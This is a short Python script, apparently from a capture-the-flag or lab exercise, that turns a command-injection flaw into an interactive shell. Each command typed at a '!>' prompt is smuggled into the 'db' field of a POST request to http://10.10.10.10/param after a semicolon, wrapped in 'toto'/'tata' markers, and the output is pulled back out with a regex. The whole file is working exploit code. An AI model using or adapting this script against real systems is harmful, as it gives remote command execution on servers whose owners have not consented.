import requests
import re
from cmd import Cmd

class Terminal(Cmd):
    prompt = "!> "

    def default(self, args):
        RunCmd(args)

def RunCmd(cmd):
    data = { 'db' : f'a;echo -n "toto"; {cmd}; echo -n "tata"' }
    r = requests.post('http://10.10.10.10/param', data=data)
    page = r.text
    m = re.findall("toto(.*)tata",page, re.DOTALL)
    print(m[0])

term = Terminal()
term.cmdloop()
